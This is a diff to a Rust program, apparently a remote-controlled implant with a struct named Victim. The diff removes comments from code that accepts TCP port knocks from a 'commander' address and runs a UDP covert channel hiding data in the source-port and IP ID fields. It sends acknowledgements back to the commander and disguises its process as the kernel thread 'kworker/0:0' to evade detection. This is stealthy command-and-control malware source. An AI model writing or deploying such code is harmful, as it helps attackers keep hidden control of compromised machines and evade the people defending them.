@@ -86,7 +86,7 @@ impl Victim {
 
             if let Ok((packet, _)) = rx_iter.next() {
                 let source_ip = packet.get_source();
-                // Port knock uses TCP SYN, covert channel uses UDP
+                // Port knock uses TCP SYN (unchanged)
                 if let Some(tcp) = pnet::packet::tcp::TcpPacket::new(packet.payload()) {
                     if tcp.get_destination() == knocks[0] {
                         let mut knock_count = 1;
@@ -135,10 +135,10 @@ impl Victim {
                     continue; 
                 }
 
-                // UDP: parse UDP request packet instead of TCP SYN
+                // UDP: parse UDP request packet
                 if let Some(parsed) = covert::parse_udp_request_from_ipv4_packet(packet.packet()) {
                     if parsed.dst_port == my_port {
-                        // UDP: covert data in source port field (cast to u32 for unmasking)
+                        // UDP: covert data in source port field
                         let unmasked = covert::unmask_word(parsed.src_port as u32, parsed.ip_id);
                         
                         if let Ok((_action, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, unmasked) {
@@ -147,7 +147,7 @@ impl Victim {
                                 local_ip,
                                 commander_ip,
                                 my_port,
-                                sig_id,  // signature goes in UDP destination port
+                                sig_id,
                             );
                             if let Some(ip_view) = pnet::packet::ipv4::Ipv4Packet::new(&ack_pkt) {
                                 let _ = tx.send_to(ip_view, IpAddr::V4(commander_ip));
@@ -375,13 +375,13 @@ fn send_covert_msg_bytes(data: &[u8], local_ip: Ipv4Addr, dst_ip: Ipv4Addr, src_
 
     while state.has_next() {
         if let Some((ip_id, raw_word, masked_word)) = state.chunk_to_send() {
-            // UDP: covert data hidden in source port (lower 16 bits of masked_word)
+            // UDP: covert data hidden in source port
             let pkt = covert::build_udp_request_packet(
                 local_ip,
                 dst_ip,
-                src_port,  // base destination port
-                ip_id,     // covert carrier in IP ID field
-                masked_word, // covert data in UDP source port
+                src_port,
+                ip_id,
+                masked_word,
             );
             if let Some(ip_view) = pnet::packet::ipv4::Ipv4Packet::new(&pkt) {
                 let _ = tx.send_to(ip_view, IpAddr::V4(dst_ip));
@@ -403,11 +403,10 @@ fn send_covert_msg_bytes(data: &[u8], local_ip: Ipv4Addr, dst_ip: Ipv4Addr, src_
 }
 
 // ============================================================================
-// PROCESS DISGUISE MODULE (Linux /proc-based)
+// PROCESS DISGUISE MODULE
 // ============================================================================
 
 fn disguise_process_name(name: &str) -> Result<(), String> {
-    // Linux kernel limit: TASK_COMM_LEN = 16 bytes (15 chars + null terminator)
     if name.len() >= 16 {
         return Err(format!("Process name '{}' exceeds 15-character kernel limit", name));
     }
@@ -422,7 +421,6 @@ fn disguise_process_name(name: &str) -> Result<(), String> {
 }
 
 fn main() {
-    // Disguise as common kernel worker thread (must be <= 15 chars)
     let disguise_name = "kworker/0:0";
     match disguise_process_name(disguise_name) {
         Ok(_) => eprintln!("[*] Process disguised as '{}'", disguise_name),
